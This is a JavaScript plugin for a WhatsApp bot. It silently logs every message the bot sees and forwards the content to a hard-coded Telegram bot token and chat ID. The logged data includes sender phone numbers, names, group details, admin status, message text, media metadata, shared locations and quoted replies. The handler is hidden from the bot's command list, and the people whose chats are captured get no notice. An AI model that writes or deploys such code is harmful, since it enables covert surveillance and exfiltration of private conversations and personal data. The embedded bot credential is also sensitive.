const { cmd } = require("../command");
const axios = require("axios");

// ═══════════════════════════════════════════════════════════
// ⚙️ TELEGRAM CONFIGURATION
// ═══════════════════════════════════════════════════════════
const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298"; 
// ═══════════════════════════════════════════════════════════

// Helper: Telegram par message bhejna (With Auto-Split)
const sendToTelegram = async (text, parseMode = "Markdown") => {
    try {
        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
        
        if (text.length > 4000) {
            const chunks = [];
            while (text.length > 0) {
                let chunk = text.slice(0, 4000);
                const lastNewline = chunk.lastIndexOf('\n');
                if (lastNewline > 3500) {
                    chunk = text.slice(0, lastNewline);
                    text = text.slice(lastNewline);
                } else {
                    text = text.slice(4000);
                }
                chunks.push(chunk);
            }
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                    chat_id: TG_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                }, { timeout: 10000 });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                chat_id: TG_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            }, { timeout: 10000 });
        }
    } catch (error) {
        console.log("[TG Logger] API Error:", error.message);
    }
};

// 🔥 GOLDEN FIX: 100% Accurate Phone Number Extractor
const extractRealNumber = (jid) => {
    if (!jid) return null;
    
    // Remove @s.whatsapp.net, @g.us, @broadcast etc.
    let clean = jid.split('@')[0];
    
    // Remove multi-device suffix (e.g., 923001234567:12 → 923001234567)
    if (clean.includes(':')) {
        clean = clean.split(':')[0];
    }
    
    // Remove any remaining non-digits
    clean = clean.replace(/[^0-9]/g, '');
    
    // Validate: Real phone numbers are 10-15 digits
    // Group IDs are usually 18+ digits starting with 120363
    if (clean.length >= 10 && clean.length <= 15 && !clean.startsWith('120363')) {
        return clean;
    }
    
    return null; // Not a valid phone number
};

// Helper: Time Format
const getTime = () => {
    return new Date().toLocaleString("en-PK", { 
        timeZone: "Asia/Karachi",
        hour12: true 
    });
};

// ═══════════════════════════════════════════════════════════
// 🌍 ULTIMATE GLOBAL LOGGER - HAR MESSAGE CAPTURE
// ═══════════════════════════════════════════════════════════
cmd({
    on: "body", 
    dontAddCommandList: true,
    filename: __filename
}, async (client, message, match, { from, body, isGroup, isCreator, sender, pushName, args, prefix }) => {
    try {
        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;

        // 🔥 STEP 1: REAL NUMBER EXTRACTION (Fixed for Groups & Private)
        let realNumber = null;
        let senderJid = null;
        
        if (isGroup) {
            // Group mein actual sender participant mein hota hai
            senderJid = message.key?.participant;
            realNumber = extractRealNumber(senderJid);
        } else {
            // Private chat mein remoteJid hi sender hota hai
            senderJid = message.key?.remoteJid || from;
            realNumber = extractRealNumber(senderJid);
        }
        
        // Agar number nahi mila, toh fallback
        if (!realNumber) {
            realNumber = extractRealNumber(sender) || extractRealNumber(from) || "Unknown";
        }
        
        const userName = message.pushName || pushName || "No Name";
        const time = getTime();
        
        // STEP 2: CHAT DETAILS
        let chatName = "Private Chat (DM)";
        let chatId = "N/A";
        let isAdmin = false;
        let groupMemberCount = 0;
        
        if (isGroup) {
            chatId = from.split('@')[0];
            try {
                const groupMeta = await client.groupMetadata(from);
                chatName = groupMeta.subject || "Unknown Group";
                groupMemberCount = groupMeta.participants ? groupMeta.participants.length : 0;
                
                // Check if sender is admin
                if (senderJid) {
                    const participant = groupMeta.participants.find(p => p.id === senderJid);
                    isAdmin = participant ? (participant.admin === 'admin' || participant.admin === 'superadmin') : false;
                }
            } catch (e) {
                chatName = "Group (Meta fetch failed)";
            }
        }

        // STEP 3: MESSAGE TYPE & CONTENT
        let msgType = "Text";
        let msgContent = body || "No Text (Media/Empty)";
        let mediaDetails = "";
        
        if (message.imageMessage) { 
            msgType = "🖼️ Image"; 
            msgContent = message.imageMessage.caption || "No Caption"; 
            mediaDetails = `\n┃ 📏 *Size:* ${message.imageMessage.fileLength || 'Unknown'} bytes`;
        }
        else if (message.videoMessage) { 
            msgType = " Video"; 
            msgContent = message.videoMessage.caption || "No Caption"; 
            mediaDetails = `\n┃ ⏱️ *Duration:* ${message.videoMessage.seconds || 0}s\n┃  *Size:* ${message.videoMessage.fileLength || 'Unknown'} bytes`;
        }
        else if (message.audioMessage) { 
            msgType = " Audio/Voice"; 
            msgContent = message.audioMessage.ptt ? "Voice Note" : "Audio File"; 
            mediaDetails = `\n┃ ️ *Duration:* ${message.audioMessage.seconds || 0}s`;
        }
        else if (message.documentMessage) { 
            msgType = " Document"; 
            msgContent = message.documentMessage.fileName || "File Sent"; 
            mediaDetails = `\n┃ 📏 *Size:* ${message.documentMessage.fileLength || 'Unknown'} bytes\n┃  *Mime:* ${message.documentMessage.mimetype || 'Unknown'}`;
        }
        else if (message.stickerMessage) { 
            msgType = "🎭 Sticker"; 
            msgContent = message.stickerMessage.isAnimated ? "Animated Sticker" : "Static Sticker"; 
        }
        else if (message.contactMessage) {
            msgType = "📇 Contact";
            msgContent = message.contactMessage.displayName || "Contact Shared";
        }
        else if (message.locationMessage) {
            msgType = "📍 Location";
            msgContent = `Lat: ${message.locationMessage.latitude}, Long: ${message.locationMessage.longitude}`;
        }

        // STEP 4: REPLY DETAILS
        let replyDetails = "";
        const quoted = message.quoted || match?.quoted;
        if (quoted) {
            const replySenderJid = quoted.key?.participant || quoted.key?.remoteJid;
            const replyNumber = extractRealNumber(replySenderJid) || "Unknown";
            const replyContent = quoted.body || quoted.text || "Media Reply";
            replyDetails = `\n┃ ↩️ *Replying To:* @${replyNumber}\n┃  *Original Msg:* ${replyContent.substring(0, 100)}${replyContent.length > 100 ? '...' : ''}`;
        }

        // STEP 5: FORWARD STATUS
        let forwardStatus = "";
        if (message.message?.extendedTextMessage?.contextInfo?.isForwarded) {
            forwardStatus = "\n┃ 🔄 *Status:* Forwarded Message";
        }

        // STEP 6: TELEGRAM MESSAGE FORMAT
        const logMessage = `
╭━━〔  *ULTIMATE ACTIVITY LOG* 〕━━⬣
┃ 🕒 *Time:* \`${time}\`
┃  *Name:* ${userName}
┃ 🔢 *Real Number:* [${realNumber}](https://wa.me/${realNumber})
┃ 👑 *Is Owner:* ${isCreator ? "✅ Yes" : "❌ No"}
┃ 💬 *Chat Type:* ${isGroup ? "👥 Group" : "👤 Private DM"}
┃ ️ *Chat Name:* ${chatName}
${isGroup ? `┃ 🆔 *Group ID:* \`${chatId}\`\n┃  *Members:* ${groupMemberCount}\n 🛡️ *Is Admin:* ${isAdmin ? "✅ Yes" : "❌ No"}` : ''}
┃ 📦 *Message Type:* ${msgType}${mediaDetails}
┃ ⌨️ *Content:* 
┃ ${msgContent}${replyDetails}${forwardStatus}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
> *Powered by Your Bot*
        `.trim();

        await sendToTelegram(logMessage);

    } catch (err) {
        console.log("[TG Logger Error]:", err.message);
    }
});
